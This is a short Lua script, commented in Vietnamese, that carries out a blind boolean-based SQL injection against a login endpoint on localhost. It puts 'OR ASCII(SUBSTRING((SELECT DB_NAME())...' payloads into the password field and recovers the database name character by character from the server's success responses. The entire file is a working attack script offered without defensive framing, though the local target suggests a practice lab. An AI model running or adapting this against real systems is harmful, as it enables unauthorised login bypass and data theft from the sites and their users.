local http = require("socket.http")
local cjson = require("cjson") -- Đã chuyển sang cjson sau khi cài đặt thành công
local url = "http://localhost:3001/users/login"
local db_name = ""

local function is_successful(payload)
    local body = "username=admin&password=" .. payload
    local response, code = http.request(url, body)

    if code == 200 then
        local parsed_response = cjson.decode(response)
        return parsed_response and parsed_response.success == true
    end
    return false
end

for i = 1, 20 do  -- Giả định tên database không dài hơn 20 ký tự
    for j = 32, 126 do -- Duyệt qua các ký tự có thể (ASCII từ 32 đến 126)
        local char = string.char(j)
        local payload = "' OR ASCII(SUBSTRING((SELECT DB_NAME()), " .. i .. ", 1)) = " .. j .. " -- "
        
        if is_successful(payload) then
            db_name = db_name .. char
            print("Character found: " .. char)
            break
        end
    end
end


print("Database name is: " .. db_name)
